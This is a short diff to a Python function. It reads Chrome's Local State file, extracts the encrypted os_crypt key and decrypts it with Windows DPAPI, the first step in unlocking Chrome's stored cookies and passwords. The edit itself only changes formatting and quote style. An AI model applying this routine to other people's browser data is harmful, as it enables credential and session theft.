@@ -32,10 +32,9 @@ def dpapi_decrypt(encrypted):
 
 
 def aes_decrypt(encrypted_txt):
-    with open(os.path.join(os.environ['LOCALAPPDATA'],
-        r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
+    with open(os.path.join(os.environ['LOCALAPPDATA'], r'Google\Chrome\User Data\Local State'), encoding='utf-8', mode='r') as f:
         jsn = json.loads(str(f.readline()))
-    encoded_key = jsn["os_crypt"]["encrypted_key"]
+    encoded_key = jsn['os_crypt']['encrypted_key']
     encrypted_key = base64.b64decode(encoded_key.encode())
     encrypted_key = encrypted_key[5:]
     key = dpapi_decrypt(encrypted_key)
